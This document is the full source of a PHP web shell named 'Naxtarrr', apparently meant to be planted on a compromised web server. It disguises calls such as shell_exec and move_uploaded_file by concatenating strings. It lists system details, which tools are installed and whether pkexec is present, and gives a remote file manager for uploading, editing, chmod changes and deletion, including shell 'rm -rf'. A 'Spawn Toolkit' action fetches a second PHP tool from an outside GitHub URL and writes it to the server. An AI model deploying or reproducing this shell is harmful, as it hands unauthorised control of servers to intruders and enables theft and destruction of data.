<!DOCTYPE html>
<html>

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nx</title>
  <link rel="stylesheet" href="https://naxtarrr.netlify.app/assets/css/shell_style2.css">
</head>

<body>
  <?php
  $path = (isset($_GET["path"])) ? $_GET["path"] : getcwd();
  $file = (isset($_GET["file"])) ? $_GET["file"] : "";

  $os = php_uname('s');

  $separator = ($os === 'Windows') ? "\\" : "/";

  $explode = explode($separator, $path);

  // Funcs concatenation
  $fe = "fun" . "cti" . "on_" . "exis" . "ts";
  $scd = "s"."c"."a"."n"."d"."i"."r";
  $se = "she" . "ll" . "_" . "e" . "xe" . "c";
  $muf = "mo" . "v" . "e_" . "u" . "plo" . "ade" . "d_" . "fi" . "le";
  $mkd = "m" . "k" . "d" . "i" . "r";
  $bn = "b" . "a" . "s" . "e" . "n" . "a" . "m" . "e";
  $fgc = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
  $dirn = "d" . "i" . "r" . "n" . "a" . "m" . "e";
  $unl = "u" . "n" . "l" . "i" . "n" . "k";
  $b64d = "ba" . "se" . "64" . "_" . "de" . "co" . "de";
  $b64e = "ba" . "se" . "64" . "_" . "en" . "co" . "de";
  $fo = "f"."o"."p"."e"."n";
  $fw = "f"."w"."r"."i"."t"."e";
  $fc = "f"."c"."l"."o"."s"."e";
  ?>

  <div class="container">
    <div class="infomin">
      <div class="order-2">
        <a href="?" class="home">Naxtarrr</a>
      </div>
      <div class="order-1">
        <?php
        $curl = ($fe("curl_version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $wget = ($se("wget --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $python = ($se("python --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $perl = ($se("perl --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $ruby = ($se("ruby --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $gcc = ($se("gcc --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $pkexec = ($se("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
        $disfuncs = @ini_get("disable_functions");
        $showdisbfuncs = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
        ?>
        <span>System Info: <?= php_uname(); ?></span>
        <span>IP: <?= $_SERVER["REMOTE_ADDR"]; ?></span>
        <span>PHP Version: <?= phpversion(); ?></span>
        <span style="width: 100%; max-width: 350px;">CURL: <?= $curl; ?>, WGET: <?= $wget; ?>, PERL: <?= $perl; ?>, RUBY: <?= $ruby; ?>, GCC: <?= $gcc; ?>, PKEXEC: <?= $pkexec; ?></span>
        <span>Disabled Functions: <?= $showdisbfuncs; ?></span>
      </div>
    </div>

    <div class="navigation">
      <?php
      if (isset($_GET["file"]) && !isset($_GET["path"])) {
        $path = $dirn($_GET["file"]);
      }
      $path = str_replace("\\", "/", $path);

      $paths = explode("/", $path);
      echo 'Current Path: ';
      echo (!preg_match("/Windows/", $os)) ? "<a href='?path=/'>~</a>" : "";
      foreach ($paths as $id => $pat) {
        echo "<a href='?path=";
        for ($i = 0; $i <= $id; $i++) {
          echo $paths[$i];
          if ($i != $id) {
            echo "/";
          }
        }
        echo "'>$pat</a>/";
      }
      ?>
    </div>
    <?php
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
      if (isset($_FILES["nax_file"])) {
        $file = $bn($_FILES["nax_file"]["name"]);
        $targetFile = $path . $separator . $file;

        if ($muf($_FILES["nax_file"]["tmp_name"], $targetFile)) {
          echo "<script>alert('$file uploaded'); window.location = '?path=$path';</script>";
        } else {
          echo "<script>alert('Upload failed'); window.location = '?path=$path';</script>";
        }
      }
    }

    if (!isset($_GET["a"])) :
      if (is_readable($path)) :
    ?>

        <div class="table-container">
          <table>
            <thead>
              <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Owner / Group</th>
                <th>Permission</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody>
              <?php
              foreach ($scd($path) as $items) {
                if (!is_dir($path . $separator . $items) || $items === ".." || $items === ".") continue;
                $color = (is_writable($path . $separator . $items)) ? "text-green" : "text-red";
              ?>
                <tr>
                  <td width="450">
                    <a href='?path=<?= $path . $separator . $items; ?>'>
                      <?= $items; ?>
                    </a>
                  </td>
                  <td>---</td0>
                  <td><?= gor($path . $separator . $items); ?> / <?= ggr($path . $separator . $items); ?></td>
                  <td class="<?= $color; ?>"><?= hi_permission($path . $separator . $items); ?></td>
                  <td>
                    <a href='?path=<?= $path . $separator . $items; ?>&a=rename'>
                      Rename
                    </a>
                    <a href='?path=<?= "$path$separator$items"; ?>&a=chmod'>
                      Chmod
                    </a>
                    <a href='?path=<?= "$path$separator$items"; ?>&a=delete' onclick="return confirm('Delete folder <?= $items; ?>?')">
                      Delete
                    </a>
                  </td>
                </tr>
                <?php
              }
              foreach ($scd($path) as $items) {
                if (is_file($path . $separator . $items)) {
                  $color = (is_writable($path . $separator . $items)) ? "text-green" : "text-red";
                ?>
                  <tr>
                    <td width="450">
                      <a href='?file=<?= "$path$separator$items&a=view"; ?>'>
                        <?= $items; ?>
                      </a>
                    </td>
                    <td><?= getFileSize("$path$separator$items"); ?></td>
                    <td><?= gor($path . $separator . $items); ?> / <?= ggr($path . $separator . $items); ?></td>
                    <td class="<?= $color; ?>"><?= hi_permission($path . $separator . $items); ?></td>
                    <td>
                      <a href='?file=<?= "$path$separator$items"; ?>&a=editFile'>
                        Edit
                      </a>
                      <a href='?file=<?= "$path$separator$items"; ?>&a=rename'>
                        Rename
                      </a>
                      <a href='?file=<?= "$path$separator$items"; ?>&a=chmod'>
                        Chmod
                      </a>
                      <a href='?file=<?= "$path$separator$items"; ?>&a=delete' onclick="return confirm('Delete file <?= $items; ?>?')">
                        Delete
                      </a>
                    </td>
                  </tr>
              <?php
                }
              }
              ?>
            </tbody>
          </table>
        </div>
      <?php
      else :
        echo "This directory's not readable";
      endif;
    endif;

    if (isset($_GET['a']) && $_GET['a'] == "view") {
      $filename = $bn($_GET["file"]);
      ?>
      <div class="card">
        <span style="display: block; margin-bottom: 10px;">Filename: <?= $filename; ?></span>
        <textarea><?= htmlspecialchars($fgc($file)); ?></textarea>
        <div style="margin-top: 5px;">
          <a href="?file=<?= $_GET['file']; ?>&a=editFile">Edit</a> | 
          <a href="?file=<?= $_GET['file']; ?>&a=rename">Rename</a> | 
          <a href="?file=<?= $_GET['file']; ?>&a=chmod">Chmod</a> | 
          <a href="?file=<?= $_GET['file']; ?>&a=delete">Delete</a> | 
        </div>
      </div>
    <?php
    } elseif (isset($_GET["a"]) && $_GET["a"] == "createFile") {
    ?>
      <div class="card">
        <form method="post">
          <div class="mb-1">
            <label for="filename" class="label-form">Filename: </label>
            <input type="text" name="filename" id="filename" placeholder="file.txt" required>
          </div>
          <div class="mb-1">
            <label for="content" class="label-form">Content: </label>
            <textarea name="content" id="content"></textarea>
          </div>
          <button type="submit" class="btn-primary">Submit</button>
        </form>
      </div>
      <?php
      if (isset($_POST["filename"])) {
        $filename = $_POST["filename"];
        $content = $b64e($_POST["content"]);
        if (doFile($path . $separator . $filename, $content)) {
          echo "<script>alert('$filename Created'); window.location = '?path=$path';</script>";
        } else {
          echo "Failed to create";
        }
      }
    } elseif (isset($_GET["a"]) && $_GET["a"] == "createFolder") {
      ?>
      <div class="card">
        <form method="post">
          <div class="mb-1">
            <label for="foldername" class="label-form">Folder Name: </label>
            <input type="text" name="foldername" id="foldername" placeholder="folder" required>
          </div>
          <button type="submit" class="btn-primary">Submit</button>
        </form>
      </div>
      <?php
      if (isset($_POST["foldername"])) {
        $foldername = $_POST["foldername"];
        echo ($mkd($path . $separator . $foldername)) ? "<script>alert('$foldername Created'); window.location = '?path=$path';</script>" : "Failed to create";
      }
    } elseif (isset($_GET['a']) && $_GET["a"] == "editFile") {
      $file = $bn($_GET["file"]);
      ?>
      <div class="card">
        <form method="post">
          <label for="content" class="label-form">Filename: <?= $file; ?></label>
          <textarea name="content" id="content"><?= htmlspecialchars($fgc($_GET['file'])) ?></textarea><br>
          <button type="submit" class="btn-primary">Submit</button>
        </form>
      </div>
      <?php
      if (isset($_POST["content"])) {
        $content = $b64e($_POST["content"]);
        if (doFile($path . $separator . $file, $content)) {
          $filename = $bn($file);

          echo "<script>alert('$filename Edited'); window.location = '?path=$path';</script>";
        } else {
          echo "Failed to create";
        }
      }
    } elseif (isset($_GET['a']) && $_GET["a"] == "delete") {
      if (!empty($_GET["file"])) {
        $filename = $bn($file);
        if ($unl($file)) {
          echo "<script>alert('$filename Deleted'); window.location = '?path=" . $dirn($_GET["file"]) . "';</script>";
        } else {
          echo "Delete $filename failed";
        }
      } else {
        $folder_name = $bn($path);
        if (is_writable($path)) {
          @rmdir($path);
          $se("rm -rf \"$path\"");
          $se("rmdir /s /q \"$path\"");
          echo "<script>alert('$folder_name Deleted'); window.location = '?path=" . $dirn($path) . "';</script>";
        } else {
          echo "Delete $folder_name failed";
        }
      }
    } elseif (isset($_GET['a']) && $_GET["a"] == "rename") {
      $oriname = (isset($_GET["file"])) ? $bn($_GET["file"]) : $bn($_GET["path"]);
      ?>
      <div class="card">
        <form method="post">
          <div class="mb-1">
            <label for="newname" class="label-form">New Name: </label>
            <input type="text" name="newname" id="newname" value="<?= $oriname; ?>" required>
          </div>
          <button type="submit" class="btn-primary">Submit</button>
        </form>
      </div>
      <?php
      if (isset($_POST["newname"])) {
        $newname = $_POST["newname"];
        $path = (isset($_GET["file"])) ? $dirn($_GET["file"]) : $dirn($_GET["path"]);
        if (rename($path . $separator . $oriname, $path . $separator . $newname)) {
          echo "<script>alert('$oriname renamed to $newname'); window.location = '?path=$path';</script>";
        } else {
          "Failed to rename";
        }
      }
    } elseif (isset($_GET['a']) && $_GET["a"] == "chmod") {
      $item = (isset($_GET["file"])) ? $_GET["file"] : $_GET["path"];

      if (isset($_POST["chmod"])) {
        $newPermissions = octdec($_POST["chmod"]);

        if (chmod($item, $newPermissions)) {
          echo "<script>alert('" . $bn($item) . " permission has changed!'); window.location = '?path=$path';</script>";
        } else {
          echo "Failed to chmod";
        }
      }
      ?>
      <div class="card">
        <form method="post">
          <div class="mb-1">
            <label for="chmod" class="label-form">Change <?= $bn($item); ?> perms: </label>
            <input type="text" name="chmod" id="chmod" value="<?= sprintf("%o", fileperms($item) & 0777); ?>" required>
          </div>
          <button type="submit" class="btn-primary">Submit</button>
        </form>
      </div>
    <?php
    } elseif (isset($_GET['a']) && $_GET["a"] == "toolkit") {
      $cc = curl_init();
      curl_setopt($cc, CURLOPT_URL, "https://raw.githubusercontent.com/nastar-id/kegabutan/master/shelk.php");
      curl_setopt($cc, CURLOPT_RETURNTRANSFER, true);
      $xx = curl_exec($cc);
      curl_close($cc);

      $tool = $b64e($xx);
      if (doFile($path . "/tools.php", $tool)) {
        echo "<script>alert('tools.php spawned!'); window.location = '?path=" . $path . "';</script>";
      } else {
        echo "<script>alert('Failed to spawn toolkit!'); window.location = '?path=" . $path . "';</script>";
      }
    }
    ?>
  </div>
  <?php

  function doFile($file, $content)
  {
    global $b64d, $b64e, $fo, $fw, $fc;

    if ($content == "") {
      $content = $b64e("empty");
    }

    $op = $fo($file, "w");
    $write = $fw($op, $b64d($content));
    $fc($op);
    return ($write) ? true : false;
  }

  function getFileSize($path)
  {
    $bytes = filesize($path);
    $units = array('B', 'KB', 'MB', 'GB');
    $unit = 0;
    while ($bytes >= 1024 && $unit < count($units) - 1) {
      $bytes /= 1024;
      $unit++;
    }
    return round($bytes, 2) . ' ' . $units[$unit];
  }

  function hi_permission($items)
  {
    $perms = fileperms($items);
    if (($perms & 0xC000) == 0xC000) {
      $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
      $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
      $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
      $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
      $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
      $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
      $info = 'p';
    } else {
      $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
      (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
      (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
      (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
  }

  function ggr($fl)
  {
    $a = "fun" . "cti" . "on_" . "exis" . "ts";
    $b = "po" . "si" . "x_ge" . "tgr" . "gid";
    $c = "fi" . "le" . "gro" . "up";
    if ($a($b)) {
      if (!$a($c)) {
        return "?";
      }
      $d = $b($c($fl));
      if (empty($d)) {
        $e = $c($fl);
        if (empty($e)) {
          return "?";
        } else {
          return $e;
        }
      } else {
        return $d['name'];
      }
    } elseif ($a($c)) {
      return $c($fl);
    } else {
      return "?";
    }
  }

  function gor($fl)
  {
    $a = "fun" . "cti" . "on_" . "exis" . "ts";
    $b = "po" . "s" . "ix_" . "get" . "pwu" . "id";
    $c = "fi" . "le" . "o" . "wn" . "er";
    if ($a($b)) {
      if (!$a($c)) {
        return "?";
      }
      $d = $b($c($fl));
      if (empty($d)) {
        $e = $c($fl);
        if (empty($e)) {
          return "?";
        } else {
          return $e;
        }
      } else {
        return $d['name'];
      }
    } elseif ($a($c)) {
      return $c($fl);
    } else {
      return "?";
    }
  }
  ?>
  <div class='menu'>
    <input class='toggle' id='menu' type='checkbox' style="display: none;">

    <div class="menu-list">
      <a href="?path=<?= $path; ?>&a=createFile">Create File</a>
      <a href="?path=<?= $path; ?>&a=createFolder">Create Folder</a>
      <a href="?path=<?= $path; ?>&a=toolkit">Spawn Toolkit</a>
      <label for="naxx">Upload File</label>
    </div>

    <label class='btn-primary menu-toggle' for='menu'>
      Open Menu
    </label>

    <form method="POST" enctype="multipart/form-data" id="upload" class="d-hidden">
      <input type="file" name="nax_file" id="naxx">
    </form>
  </div>
  <script>
    const uploadInput = document.querySelector("#naxx");
    uploadInput.addEventListener("change", () => {
      const uploadForm = document.querySelector("#upload");
      uploadForm.submit();
    });

    const modeToggle = document.querySelector("#mode-toggle");
    const modeToggleLabel = document.querySelector("[for=mode-toggle] span");
    const body = document.body;

    const mode = 'dark';

    if (mode === "dark") {
      body.classList.add("dark");
      modeToggle.checked = true;
      modeToggleLabel.innerText = "Light Mode";
    } else {
      body.classList.remove("dark");
      modeToggle.checked = false;
      modeToggleLabel.innerText = "Dark Mode";
    }
  </script>
</body>

</html>
